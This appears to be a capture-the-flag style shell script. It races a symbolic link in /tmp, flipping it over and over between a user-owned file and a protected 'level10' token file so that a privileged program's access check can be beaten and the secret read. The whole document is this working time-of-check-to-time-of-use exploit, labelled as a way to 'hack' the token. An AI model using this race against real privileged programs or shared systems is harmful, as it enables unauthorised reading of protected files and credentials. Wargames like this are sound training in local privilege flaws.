
#!/bin/sh
# Path to the file we want to hack
TOKEN_FILE="/home/user/level10/token"
# Path to the a file that I created
MY_FILE="/tmp/mylink"
# Path to the symbolic link of the file that will store the secret
TMP_FILE="/tmp/tmpfile"

#!/bin/sh

while true
    do
        echo "link to my file"
        ln -sf $MY_FILE $TMP_FILE
        echo "Linking to real token"
        ln -sf $TOKEN_FILE $TMP_FILE
done